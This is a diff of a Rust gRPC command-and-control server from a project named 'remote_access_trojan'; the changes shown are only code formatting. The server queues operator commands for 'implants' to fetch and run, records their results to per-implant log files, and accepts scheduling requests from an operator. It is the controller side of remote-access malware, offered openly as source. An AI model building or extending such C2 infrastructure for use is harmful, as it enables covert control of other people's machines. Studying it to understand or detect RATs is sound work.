@@ -1,16 +1,20 @@
-use remote_access_trojan::rat::{OperatorCommand, OperatorRequest, OperatorResponse, RatCommand};
-use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
-use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
+use remote_access_trojan::rat::ask_for_instructions_server::{
+    AskForInstructions, AskForInstructionsServer,
+};
+use remote_access_trojan::rat::record_command_result_server::{
+    RecordCommandResult, RecordCommandResultServer,
+};
 use remote_access_trojan::rat::schedule_command_server::{ScheduleCommand, ScheduleCommandServer};
-use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
+use remote_access_trojan::rat::{Beacon, CommandRequest, CommandResponse, Empty};
+use remote_access_trojan::rat::{OperatorCommand, OperatorRequest, OperatorResponse, RatCommand};
 use remote_access_trojan::RsRatCommand;
 use std::collections::HashMap;
 use std::convert::From;
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::path::Path;
-use tonic::{Request, Response, Status};
 use tonic::transport::Server;
+use tonic::{Request, Response, Status};
 
 /*
 TODO
@@ -41,19 +45,15 @@ impl AskForInstructions for MyAskForInstructions {
         // If the command number exists in the server already, send it back to the implant to run
         // Otherwise, send the 'None' command, which tells the implant there is nothing new
         if fake_commands.len() > command_number {
-            Ok(Response::new(
-                CommandRequest {
-                    command: RatCommand::try_into(fake_commands[&command_number].0).unwrap(),
-                    arguments: fake_commands[&command_number].1.clone()
-                }
-            ))
+            Ok(Response::new(CommandRequest {
+                command: RatCommand::try_into(fake_commands[&command_number].0).unwrap(),
+                arguments: fake_commands[&command_number].1.clone(),
+            }))
         } else {
-            Ok(Response::new(
-                CommandRequest {
-                    command: RatCommand::try_into(RatCommand::None).unwrap(),
-                    arguments: String::from("")
-                }
-            ))
+            Ok(Response::new(CommandRequest {
+                command: RatCommand::try_into(RatCommand::None).unwrap(),
+                arguments: String::from(""),
+            }))
         }
     }
 }
@@ -68,7 +68,8 @@ impl RecordCommandResult for MyRecordCommandResult {
         let request = request.into_inner();
         let implant_id = request.implant_id;
         let timestamp = request.timestamp;
-        let command: &str = RsRatCommand::from(RatCommand::from_i32(request.command).unwrap()).into();
+        let command: &str =
+            RsRatCommand::from(RatCommand::from_i32(request.command).unwrap()).into();
         let arguments = request.arguments;
         let result = request.result;
         // Determine where the result should be written based on the implant ID
@@ -81,15 +82,13 @@ impl RecordCommandResult for MyRecordCommandResult {
         }
         // Open the file and write the data to it
         let mut file = OpenOptions::new()
-                                .create(true)
-                                .append(true)
-                                .open(filename)
-                                .unwrap();
+            .create(true)
+            .append(true)
+            .open(filename)
+            .unwrap();
         writeln!(file, "{data}").unwrap();
         // Respond to the implant basically say 'done'
-        Ok(Response::new(
-            Empty {}
-        ))
+        Ok(Response::new(Empty {}))
     }
 }
 
@@ -98,7 +97,10 @@ pub struct MyScheduleCommand {}
 
 #[tonic::async_trait]
 impl ScheduleCommand for MyScheduleCommand {
-    async fn send(&self, request: Request<OperatorRequest>) -> Result<Response<OperatorResponse>, Status> {
+    async fn send(
+        &self,
+        request: Request<OperatorRequest>,
+    ) -> Result<Response<OperatorResponse>, Status> {
         // Get the request from the operator and figure out what to do with it
         let inner = request.into_inner();
         let command = OperatorCommand::from_i32(inner.command).unwrap();
@@ -157,11 +159,9 @@ impl ScheduleCommand for MyScheduleCommand {
             }
         };
         // Respond to the implant basically say 'done'
-        Ok(Response::new(
-            OperatorResponse {
-                data: command_result
-            }
-        ))
+        Ok(Response::new(OperatorResponse {
+            data: command_result,
+        }))
     }
 }
 
@@ -173,8 +173,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Stand up the server and run it
     Server::builder()
-        .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
-        .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
+        .add_service(AskForInstructionsServer::new(
+            MyAskForInstructions::default(),
+        ))
+        .add_service(RecordCommandResultServer::new(
+            MyRecordCommandResult::default(),
+        ))
         .add_service(ScheduleCommandServer::new(MyScheduleCommand::default()))
         .serve(socket)
         .await?;
